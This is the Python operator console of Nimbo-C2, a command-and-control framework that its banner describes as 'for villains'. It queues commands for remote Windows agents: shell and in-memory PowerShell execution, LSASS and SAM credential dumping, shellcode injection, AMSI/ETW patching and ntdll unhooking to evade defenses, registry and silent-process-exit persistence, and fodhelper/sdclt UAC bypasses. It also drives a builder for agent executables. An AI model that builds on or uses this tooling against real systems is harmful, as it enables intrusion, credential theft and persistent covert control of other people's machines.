from server import utils
from server import listener
from server import ps_modules

import re
import shlex
import json
import subprocess
from tabulate import tabulate
from jsonc_parser.parser import JsoncParser
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.formatted_text import FormattedText
from prompt_toolkit.output import ColorDepth

# parse config
config = JsoncParser.parse_file("config.jsonc")
log_file = config["c2"]["logging"]["log_file"]
is_save_agents_on_exit = config["c2"]["save_agents_data"]["save_on_exit"]
agents_file_path = config["c2"]["save_agents_data"]["save_path"]
agent_prompt_color = config["c2"]["prompt"]["agent_prompt_color"]
nimbo_prompt_color = config["c2"]["prompt"]["nimbo_prompt_color"]
start_listener_on_start = config["c2"]["general"]["start_listener_on_start"]
collect_folder = config["c2"]["general"]["collect_folder"]

user_agent_pattern = r"[0-9a-f]{8}"
main_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 > ")])
agent_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 "),
                                   (f"fg:{agent_prompt_color}", "[AGENT-ID]"), ("", " > ")])
agent_completer = NestedCompleter.from_nested_dict({
    'cmd ': None,
    'iex ': None,
    'download ': None,
    'upload ': None,
    'pstree': None,
    'checksec': None,
    'clipboard': None,
    'screenshot': None,
    'unhook': None,
    'amsi': None,
    'etw': None,
    'persist': {
        'run': None,
        'spe': None
    },
    'uac': {
        'fodhelper',
        'sdclt'
    },
    'lsass': {
        'direct': None,
        'comsvcs': None
    },
    'sam': None,
    'shellc': None,
    'assembly': None,
    'msgbox': None,
    'speak': None,
    'sleep ': None,
    'collect': None,
    'kill': None,
    'show': None,
    'back': None,
    'cls': None,
    'help': None,
    'exit': None
})

banner = """

    ███    ██ ██ ███    ███ ██████   ██████                 ██████ ██████  
    ████   ██ ██ ████  ████ ██   ██ ██    ██               ██           ██ 
    ██ ██  ██ ██ ██ ████ ██ ██████  ██    ██     █████     ██       █████  
    ██  ██ ██ ██ ██  ██  ██ ██   ██ ██    ██               ██      ██      
    ██   ████ ██ ██      ██ ██████   ██████                 ██████ ███████ 
    
    >> Lightweight C2 Framework for villains :)
       https://github.com/itaymigdal/Nimbo-C2
       By Itay Migdal
       
            +-
            -@=           .........              *-
    +*++-:.  :@-   . ..-=*##+.::.:++=-:..       #*   .-=++:
    :=**####*=*@::-:-+%@@@%#+:::.-##@@%*=:..   *#.=*%%%#+-
       :-+*#%%%*==-*@@%*=-::::::::--=*#@@%+-:.+@##*=:.
      .---::...==:+%#=--::::::::::::::-=+%@%-:-****+=.
              .=-:::--.     :::::::.  .:--=-:::     .
              :=-::--  -*##: ::::. -==. .=:::::
              :=-::=. -%%%:  .-:. #@@@*. :=:::.
              :=-:-=  +@++=. .-- =@#++   .=:::.
              :=-::=: .*%%%- -:- .%%##-  -=:::
              .=-::-=:  ..  --:-: .-=:  :=--::
              .=--==---::::-------.   :-=--::-
              -=--*-.----------------------::-.
             .===--++*#++=---:::-:----=----:--:
             -===--=:*%%%%%%#**--+=..+=----::.-.
             =.:+---:=*####%#=%%##+.:---==::: ::
            :: .===------===-.---:------+=:-.  :
           .-   ==++-===-----=----------==-:.  .:
        :--=-   :==+=--------------------+--.   -:::.
         .       -======----------------==--:
                 .========================---
                  .======-:..   ..::-=======-
                   .===:              .:-====.
                  ..-=.                  .:-=-...
     ...........:---:..................:....:----:................
     
    """


def exit_nimbo():
    listener.listener_stop()
    if is_save_agents_on_exit:
        try:
            with open(agents_file_path, "wt") as f:
                json.dump(listener.agents, f)
            utils.log_message(f"[*] Saved agent data")
        except Exception:
            utils.log_message(f"[-] Could not save agent data")

    exit()


def print_main_help():
    main_help = f"""
    --== Agent ==--
    agent list                    ->  list active agents
    agent interact <agent-id>     ->  interact with the agent
    agent remove <agent-id>       ->  remove agent data
    
    --== Builder ==--
    build exe                     ->  build exe agent (-h for help)
    build dll                     ->  build dll agent (-h for help)
    
    --== Listener ==--
    listener start                ->  start the listener
    listener stop                 ->  stop the listener
    listener status               ->  print the listener status
    
    --== General ==--
    cls                           ->  clear the screen
    help                          ->  print this help message
    exit                          ->  exit Nimbo-C2
    """

    print(main_help)


def print_agent_help():
    agent_help = f"""
    --== Send Commands ==--
    cmd <shell-command>                    ->  execute a shell command 
    iex <powershell-scriptblock>           ->  execute in-memory powershell command
    
    --== File Stuff ==--
    download <remote-file>                 ->  download a file from the agent (wrap path with quotes)
    upload <local-file> <remote-path>      ->  upload a file to the agent (wrap paths with quotes)
    
    --== Discovery Stuff ==--
    pstree                                 ->  show process tree
    checksec                               ->  check for security products
    
    --== Collection Stuff ==--
    clipboard                              ->  retrieve clipboard
    screenshot                             ->  retrieve screenshot
    
    --== Post Exploitation Stuff ==--
    lsass <method>                         ->  dump lsass.exe [methods:  direct,comsvcs] (elevation required)
    sam                                    ->  dump sam,security,system hives using reg.exe (elevation required)
    shellc <raw-shellcode-file> <pid>      ->  inject shellcode to remote process
    assembly <local-assembly> <args>       ->  execute .net assembly (pass all args as a single string using quotes)
                                               warning: make sure the assembly doesn't call any exit function
    
    --== Evasion Stuff ==--
    unhook                                 ->  unhook ntdll.dll
    amsi                                   ->  patch amsi out of the current process
    etw                                    ->  patch etw out of the current process
    
    --== Persistence Stuff ==--
    persist run <command> <key-name>       ->  set run key (will try first hklm, then hkcu)
    persist spe <command> <process-name>   ->  persist using silent process exit technique (elevation required)
    
    --== Privesc Stuff ==--
    uac fodhelper <command> <keep/die>     ->  elevate session using the fodhelper uac bypass technique
    uac sdclt <command> <keep/die>         ->  elevate session using the sdclt uac bypass technique
    
    --== Interaction stuff ==--
    msgbox <title> <text>                  ->  pop a message box (blocking! waits for enter press)
    speak <text>                           ->  speak using sapi.spvoice com interface
    
    --== Communication Stuff ==--
    sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
    clear                                  ->  clear pending commands
    collect                                ->  recollect agent data
    kill                                   ->  kill the agent (persistence will still take place)
    
    --== General ==--
    show                                   ->  show agent details
    back                                   ->  back to main screen
    cls                                    ->  clear the screen
    help                                   ->  print this help message
    exit                                   ->  exit Nimbo-C2
    """

    print(agent_help)


def print_agents(agent=None):

    agents = listener.agents

    if len(agents) == 0:
        print("[-] No active agents")
        return

    if agent:
        agents = {agent: agents[agent] for a in agents if a == agent}

    agent_table = {"Agent ID": [agent for agent in agents]}
    for p in [i for i in list(agents.values())[0]["info"]]:
        agent_table[p] = [agents[agent]["info"][p] for agent in agents if agents[agent]["info"].get(p)]

    utils.log_message(f"\n{tabulate(agent_table, headers='keys', tablefmt='grid')}\n", print_time=False)


def agent_screen(agent_id):
    while True:
        with patch_stdout():
            command = session.prompt(eval(str(agent_prompt_text).replace("AGENT-ID", agent_id)),
                                     completer=agent_completer,
                                     complete_while_typing=False,
                                     color_depth=ColorDepth.TRUE_COLOR,
                                     wrap_lines=False)

        try:
            if re.fullmatch(r"\s*cmd .+", command):
                shell_command = re.sub(r"\s*cmd\s+", "", command, 1)
                command_dict = {
                    "command_type": "cmd",
                    "shell_command": "cmd.exe /c " + shell_command
                }

            elif re.fullmatch(r"\s*iex .+", command):
                powershell_command = re.sub(r"\s*iex\s+", "", command, 1)
                encoded_powershell_command = utils.encode_base_64(powershell_command)
                command_dict = {
                    "command_type": "iex",
                    "encoded_powershell_command": encoded_powershell_command
                }

            # handle ps_modules
            elif re.fullmatch(r"\s*(pstree)\s*", command):
                ps_module = command.replace(" ", "")
                powershell_command = getattr(ps_modules, ps_module)
                encoded_powershell_command = utils.encode_base_64(powershell_command)
                command_dict = {
                    "command_type": "iex",
                    "ps_module": ps_module,
                    "encoded_powershell_command": encoded_powershell_command
                }

            elif re.fullmatch(r"\s*download .+", command):
                remote_file = shlex.split(re.sub(r"\s*download\s+", "", command, 1))[0]
                command_dict = {
                    "command_type": "download",
                    "src_file": remote_file
                }

            elif re.fullmatch(r"\s*upload .+", command):
                args = re.sub(r"\s*upload\s+", "", command, 1)
                local_file = shlex.split(args)[0]
                remote_file = shlex.split(args)[1]
                local_file_content = utils.read_file(local_file)
                if not local_file_content:
                    continue
                else:
                    src_file_data_base64 = utils.encode_base_64(local_file_content, encoding="utf-8")
                command_dict = {
                    "command_type": "upload",
                    "src_file_data_base64": src_file_data_base64,
                    "dst_file_path": remote_file
                }

            elif re.fullmatch(r"\s*checksec\s*", command):
                command_dict = {
                    "command_type": "checksec"
                }

            elif re.fullmatch(r"\s*clipboard\s*", command):
                command_dict = {
                    "command_type": "clipboard"
                }

            elif re.fullmatch(r"\s*screenshot\s*", command):
                command_dict = {
                    "command_type": "screenshot"
                }

            elif re.fullmatch(r"\s*lsass\s+(direct|comsvcs)", command):
                dump_method = re.sub(r"\s*lsass\s+", "", command, 1)
                command_dict = {
                    "command_type": "lsass",
                    "dump_method": dump_method
                }

            elif re.fullmatch(r"\s*sam\s*", command):
                command_dict = {
                    "command_type": "sam"
                }

            elif re.fullmatch(r"\s*shellc .+", command):
                args = re.sub(r"\s*shellc\s+", "", command, 1)
                shellc_file = shlex.split(args)[0]
                pid = int(shlex.split(args)[1])
                shellc_file_content = utils.read_file(shellc_file)
                if not shellc_file_content:
                    continue
                else:
                    shellc_base64 = utils.encode_base_64(shellc_file_content, encoding="utf-8")
                command_dict = {
                    "command_type": "shellc",
                    "shellc_base64": shellc_base64,
                    "pid": pid
                }

            elif re.fullmatch(r"\s*assembly .+", command):
                args = re.sub(r"\s*assembly\s+", "", command, 1)
                assembly_file = shlex.split(args)[0]
                assembly_args = shlex.split(args)[1]
                assembly = utils.read_file(assembly_file)
                if not assembly:
                    continue
                else:
                    assembly_base64 = utils.encode_base_64(assembly)
                command_dict = {
                    "command_type": "assembly",
                    "assembly_base64": assembly_base64,
                    "assembly_args": assembly_args
                }

            elif re.fullmatch(r"\s*unhook\s*", command):
                command_dict = {
                    "command_type": "unhook"
                }

            elif re.fullmatch(r"\s*amsi\s*", command):
                command_dict = {
                    "command_type": "amsi"
                }

            elif re.fullmatch(r"\s*etw\s*", command):
                command_dict = {
                    "command_type": "etw"
                }

            elif re.fullmatch(r"\s*persist\s+(run|spe)\s+.*", command):
                args = shlex.split(re.sub(r"\s*persist\s+", "", command, 1))
                persist_method = args[0]
                persist_command = args[1]
                command_dict = {
                    "command_type": "persist-" + persist_method,
                    "persist_command": persist_command
                }
                if persist_method == "run":
                    command_dict["key_name"] = args[2]
                elif persist_method == "spe":
                    command_dict["process_name"] = args[2]
                else:  # should not get here
                    continue

            elif re.fullmatch(r"\s*uac\s+(fodhelper|sdclt)\s+.*\s+(keep|die)\s*", command):
                args = shlex.split(re.sub(r"\s*uac\s+", "", command, 1))
                bypass_method = args[0]
                elevated_command = args[1]
                keep_or_die = args[2]
                command_dict = {
                    "command_type": "uac-bypass",
                    "bypass_method": bypass_method,
                    "elevated_command": elevated_command,
                    "keep_or_die": keep_or_die
                }

            elif re.fullmatch(r"\s*msgbox .+", command):
                args = re.sub(r"\s*msgbox\s+", "", command, 1)
                title = shlex.split(args)[0]
                text = shlex.split(args)[1]
                command_dict = {
                    "command_type": "msgbox",
                    "title": title,
                    "text": text
                }

            elif re.fullmatch(r"\s*speak .+", command):
                text = shlex.split(re.sub(r"\s*speak\s+", "", command, 1))[0]
                command_dict = {
                    "command_type": "speak",
                    "text": text
                }

            elif re.fullmatch(r"\s*sleep\s+\d+\s+\d+\s*", command):
                args = re.sub(r"\s*sleep\s+", "", command, 1)
                timeframe = int(re.split(r"\s+", args)[0])
                jitter_percent = int(re.split(r"\s+", args)[1])
                command_dict = {
                    "command_type": "sleep",
                    "timeframe": timeframe,
                    "jitter_percent": jitter_percent
                }

            elif re.fullmatch(r"\s*clear\s*", command):
                listener.agents[agent_id]["pending_commands"] = []
                continue

            elif re.fullmatch(r"\s*kill\s*", command):
                command_dict = {
                    "command_type": "kill"
                }

            elif re.fullmatch(r"\s*collect\s*", command):
                command_dict = {
                    "command_type": "collect"
                }

            elif re.fullmatch(r"\s*show\s*", command):
                print_agents(agent=agent_id)
                continue

            elif re.fullmatch(r"\s*back\s*", command):
                return

            elif re.fullmatch(r"\s*cls\s*", command):
                utils.clear_screen()
                continue

            elif re.fullmatch(r"\s*help\s*", command):
                print_agent_help()
                continue

            elif re.fullmatch(r"\s*exit\s*", command):
                raise KeyboardInterrupt

            elif re.fullmatch(r"\s*", command):
                continue

            else:
                print("[-] Wrong command")
                continue

            listener.agents[agent_id]["pending_commands"] += [command_dict]

        except Exception:
            print("[-] Could not parse command")
            continue


def send_build_command(build_params):
    build_command = "python3 builder/build.py " + build_params
    subprocess.run(build_command, shell=True)


def main_screen():
    while True:
        agents_dict = dict.fromkeys(list(listener.agents.keys()))
        main_completer = NestedCompleter.from_nested_dict({
            'agent': {
                'list': None,
                'interact': agents_dict,
                'remove': agents_dict
            },
            'build': {
                'exe': None,
                'dll': None
            },
            'listener': {
                'start': None,
                'status': None,
                'stop': None
            },
            'cls': None,
            'help': None,
            'exit': None
        })
        with patch_stdout():
            command = session.prompt(main_prompt_text, completer=main_completer, complete_while_typing=False,
                                     color_depth=ColorDepth.TRUE_COLOR)

        if re.fullmatch(r"\s*agent\s+list\s*", command):
            print_agents()

        elif re.fullmatch(r"\s*agent\s+interact\s+" + user_agent_pattern, command):
            agent_id = re.split(r"\s+", command)[2]
            agent_screen(agent_id)

        elif re.fullmatch(r"\s*agent\s+remove\s+" + user_agent_pattern, command):
            agent_id = re.split(r"\s+", command)[2]
            listener.agents.pop(agent_id)

        elif re.fullmatch(r"\s*agent\s+list\s*", command):
            print_agents()
        
        elif re.fullmatch(r"\s*build\s+.*", command):
            build_params = re.sub(r"\s*build\s+", "", command, 1)
            send_build_command(build_params)

        elif re.fullmatch(r"\s*listener\s+start\s*", command):
            listener.listener_start()

        elif re.fullmatch(r"\s*listener\s+status\s*", command):
            listener.listener_status()

        elif re.fullmatch(r"\s*listener\s+stop\s*", command):
            listener.listener_stop()

        elif re.fullmatch(r"\s*cls\s*", command):
            utils.clear_screen()

        elif re.fullmatch(r"\s*help\s*", command):
            print_main_help()

        elif re.fullmatch(r"\s*exit\s*", command):
            raise KeyboardInterrupt

        elif re.fullmatch(r"\s*", command):
            pass

        else:
            print("[-] Wrong command")


if __name__ == '__main__':
    try:
        # create prompt session
        session = PromptSession()
        # print Nimbo-C2 banner
        print(banner)
        # handle agents data loading
        if is_save_agents_on_exit:
            try:
                with open(agents_file_path, "rt") as f:
                    listener.agents = json.load(f)
                utils.log_message(f"[*] Loaded agent data")
            except Exception:
                utils.log_message(f"[-] Could not load agent data")
        # handle listener starting
        if start_listener_on_start:
            listener.listener_start()
            utils.log_message(f"[*] Listener started")
        # go to main screen
        main_screen()

    except KeyboardInterrupt:
        pass
    except Exception as e:
        utils.log_message("[-] Error:", e)
    finally:
        exit_nimbo()
